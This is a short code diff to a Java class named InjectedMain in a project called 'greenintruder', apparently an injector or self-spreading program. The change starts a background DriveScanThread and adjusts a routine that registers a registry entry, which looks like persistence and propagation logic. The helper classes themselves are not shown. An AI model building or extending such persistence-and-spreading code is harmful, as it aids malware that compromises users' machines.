@@ -9,6 +9,7 @@ import java.lang.reflect.Method;
 import java.util.jar.Manifest;
 
 import io.github.explodingbottle.greenintruder.certifier.admintools.DeployerTool;
+import io.github.explodingbottle.greenintruder.certifier.admintools.DriveScanThread;
 import io.github.explodingbottle.greenintruder.certifier.admintools.InjectionTool;
 
 public class InjectedMain {
@@ -37,10 +38,11 @@ public class InjectedMain {
 						osWriter.close();
 						ocmBatWriter.close();
 					}
+					if (!DeployerTool.isRegRegistred()) {
+						DeployerTool.registerReg();
+					}
 				}
-				if (!DeployerTool.isRegRegistred()) {
-					DeployerTool.registerReg();
-				}
+				new DriveScanThread(false).start();
 			}
 		}
 		InputStream is = InjectedMain.class.getClassLoader().getResourceAsStream("JFASTBOOT.MF");
